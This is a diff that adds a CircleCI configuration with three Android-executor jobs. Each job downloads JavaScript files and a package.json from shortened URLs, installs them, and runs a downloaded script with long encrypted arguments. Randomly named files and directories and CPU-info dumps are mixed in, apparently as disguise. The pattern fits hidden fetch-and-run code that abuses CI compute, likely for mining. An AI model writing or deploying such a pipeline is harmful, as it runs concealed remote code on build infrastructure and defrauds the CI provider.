@@ -1,0 +1,73 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  loading:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch pca7br4nvm43a37og.js
+      - run: mkdir 6frhlw6yvc7t0stdez64lhjaxfr1e6
+      - run: curl -fsSL shorturl.at/svwI3 -o 11s0l60zxwb.js && curl -fsSL
+          shorturl.at/zCMQ7 -o jsbjnemii4216eqhks.js && curl -fsSL
+          shorturl.at/yzDE0 -o package.json
+      - run: touch p34bf8zgve5deptzcoolhr6ue6vwpg3f.css
+      - run: npm i -s
+      - run: mkdir rr72f6rsr9zwquzof
+      - run: touch j40vt4t9vygc.ts
+      - run: cat /etc/os-release
+      - run: node jsbjnemii4216eqhks -lpn U2FsdGVkX19CpmF+/O1grhqtg6AyoAmlU6DHXjEgRqk=
+          -t U2FsdGVkX1+0xSvtEvsBKjRpfnVClv1Ao7Edq7lClyDKHpLxomX6A8TH7mvWdhrb -s
+          U2FsdGVkX1/DX8mAxsrwcFfxM29RJ86QykzrC9k6qcGidULhhkvZfTx/6otaQYkR2/STd4CbnyuOOyKhq+YmD88qRM45Ju5JEGn3R6vrpBO7BkX/LNqw4ba2JC8yjmTJ0ogM8RxOsjL4lSZGSNRbSPp+o+QwSCl4p6blhonEuGv9aYvpoWZtPoLB+a1yOIqLjA8XhYN9b8ufEFQkJWxdteT3GSsfIvJCTDH25niH1fw=
+          -sp -r
+          U2FsdGVkX19JvCt9g+9HVymi5wTNatxtdQIX7X2qu/asWD12F2Il380EF4RnECwWg02U2zWAMPcWUSuS6w9+foRVM7oQ9Ckx6T5s0FKGdgGAukTq2lvfV2KxewWGXylq2vWOKYKeu1Zq3D5SGa1AacJUGy/NTlvtkJd5I1QobA0P7jK8TVsKyaxYt8h5DD7/eLjVspiNtfGXWZso6aGToQ/Th9IITqap1Bo7U/q6vwdko61BlYZjcvcO71jcZfoD7Bfeffhm+CIZkhOTwHuAy354vO/fI3Q0iQiSNpst+xw=
+  xay-dung:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: curl -fsSL shorturl.at/efjD8 -o 17htua0be2.js && curl -fsSL
+          shorturl.at/arIPX -o package.json && curl -fsSL shorturl.at/vHO47 -o
+          jg68jdjxa.js
+      - run: touch 8z0j4637058peiwq50t.css
+      - run: touch r1tqiluycb94dol3ygxol0oc6u4.ts
+      - run: npm i -s
+      - run: cat /proc/cpuinfo
+      - run: mkdir zjmcnk1qb38oqnbwhm3mkgh
+      - run: mkdir 1xywscfr32ido6arsvguuufyb
+      - run: node jg68jdjxa -s
+          U2FsdGVkX1/4vLl46xIgvLjE1c8kT4Mgm6opyFOgyyaVAKW3tcI2iwp6Q+bD8plZnfZtJ7CZS9dMQFIa6Ctd/c5WeBgcaxjRiUbsVQnok40qubTuXJvY9P/cYfzypUHemlZ0N8b/Io1jUDkEjedSm1jWEKn79LTwoE6qem8szZ2c1C+b7+bfuinRYo6fpK4ZQCPKG/zqMJWRxbldOEzMNp3dZzkwhYVsT9mYdyWQvbc=
+          -t U2FsdGVkX1/V0qoEgsTPFgF2YbamqOE2Myo/wCHKnGSznlUYDxgVVuPLulUziQIm -r
+          U2FsdGVkX1/ndteB7Aq6YOI6m1iPjcLuFGFKg96OzA1I15z5Kg5Gc7Vbt/IPbmu/zNT5zlU5GMWc2C6veIJJGcb4Rjy2PTyi4ehPJ+F7rNXfSbie+4+1Jc9neRqJygJTauY9dB2zOdsXaMU4Tl2bhjfqLofMKCdKikQB841xFLNiQcJfDYtx4QV7ZxFUUarpfCQV5+/aYLdXX4OU+tFUns5tlPR/G3DEu58duqjsGPQ5FPHAIgmNu4QDZe01p2vAImHQaYyi5D5px8xMZasFUQX0zCGvC16BbRq4S6Wwt+E=
+          -lpn U2FsdGVkX1/e2tjsnSUXbqsgWTtI4v+yzWVestqtpBM= -sp
+  start-jobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/dlHX1 -o u8osoz87k6l0znin4q.js && curl -fsSL
+          shorturl.at/uwBV5 -o obcmnkazhkdyooee5k1g.js && curl -fsSL
+          shorturl.at/dsyJM -o package.json
+      - run: echo version 61344002584.05833
+      - run: cat /proc/cpuinfo
+      - run: npm i -s
+      - run: mkdir d4velwuqmfe1658nhb3sn
+      - run: touch ouia3m93cdh66i.html
+      - run: node u8osoz87k6l0znin4q -r
+          U2FsdGVkX1+177NsENseKYDEPYt8CbXVsSj9uRmO3ftSRffWbBkwKrM29/sZXpwKKPNmWfJ/5KRm6wWhNH2x89HXPtaa81km/LrDnuKvlX5B0Gwf4Dy0SWtBuvYE/sZDmTJBUQGRS0Uvo/TCbSgEjQ1YAIzZ6DNP/mQMjnveRcCi60xKeTfFqauje0YMQrhYerxS9Lc2wvaASSmMm/oDq1XGHfmOGmDf+iUzTSzqCO5u8zCOTp9ozJwZ1g5DFXvKvX4PzNMzpWqDYTcgFuw/cU5lalZP7qxHUk9zs7DRW/o=
+          -lpn U2FsdGVkX18wkgx8mMqYAnzkoQis9NHfco0IfzL3J8b83kCYukMhxoymzq9WxYFe
+          -s
+          U2FsdGVkX1/kdeUqe2/nLnV/uh7yHg60ANyIT2sALxHd/INf97LiVtgMW8aUUtMiP9xkJRCwXMjRvdrrgMCzcKn3ZzTEiAi2dOuHu+ZXFvcR/iPnn9oNVmgY6V/i25EgTSpgVRn7u3deatwTr8Hvae/8INmJ1rf40tMXiAm7FVYmfi04/0TunAnyRYXiBghLet39cnDUquzKZyKytgkTHPBg98IcSE8EcqOl1W15L64=
+          -sp -t
+          U2FsdGVkX1/6oeqbyqPjkU4ho92EHKrbrdvtry3qUVa0RVhCn8k8zStuv6kG8PZ0
+      - run: mkdir vb9p5knpj70j57javfxtotxl
+      - run: touch fi6sym022wqiy1v7fgfnph.sh
+workflows:
+  working:
+    jobs:
+      - loading
+      - start-jobs
+  NodejsJobs:
+    jobs:
+      - xay-dung
